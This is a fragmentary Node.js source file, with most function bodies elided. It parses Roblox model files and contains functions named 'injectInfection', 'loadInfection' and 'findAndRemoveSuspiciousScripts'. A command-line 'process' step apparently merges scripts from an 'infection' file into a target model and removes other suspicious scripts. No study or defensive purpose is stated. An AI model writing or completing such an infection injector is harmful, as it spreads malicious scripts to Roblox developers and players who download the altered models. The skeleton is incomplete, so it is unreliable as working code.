...
const dist = require("rbxm-parser");
const fs = require("fs");
const path = require("path");
const { RobloxFile, Instance, Model, Script, ModuleScript, Folder, IntValue, AtmosphereSensor, BuoyancySensor, ControllerPartSensor, FluidForceSensor, ClickDetector, Configuration, DataType, } = require("rbxm-parser");
class GenericInstance extends Instance {
    _customClassName;
    _propertyValidationsEnabled;
    ...
    enablePropertyValidation(enable) {
...
const instanceConstructors = new Map([
    ["Model", () => new Model()],
    ["Script", () => new Script()],
...
function printInstanceHierarchy(instance, prefix = "") {
...
function cacheScriptSources(instance) {
...
function validateInstance(instance, errors = [], path = "") {
    let isValid = true;
...
function cloneInstance(sourceInstance, targetParent) {
    let newInstance;
    ...
    if (sourceInstance._props instanceof Map) {
        const targetProps = newInstance._props = new Map();
...
function removeInstances(instance, namesToRemove) {
...
function findAndRemoveSuspiciousScripts(instance) {
...
function injectInfection(originalFile, infectionRoots) {
...
class RbxmBridge {
    static async processModel(modelPath, infectionPath, outputPath) {
        try {
    ...
    static async loadInfection(infectionPath) {
        try {
            const infectionBuffer = fs.readFileSync(infectionPath);
            const infectionFile = RobloxFile.ReadFromBuffer(infectionBuffer);
            if (!infectionFile || !infectionFile.Roots?.length) {
            ...
            const metadata = {
                roots: infectionFile.Roots.map((root) => ({
    ...
    try {
        switch (command) {
            case 'process':
                ...
                await RbxmBridge.processModel(args[1], args[2], args[3]);
                break;
            case 'load':
                if (args.length !== 2) {
                ...
                await RbxmBridge.loadInfection(args[1]);
                break;
            case 'validate':
                if (args.length !== 2) {
                ...
                await RbxmBridge.validateModel(args[1]);
                break;
            default:
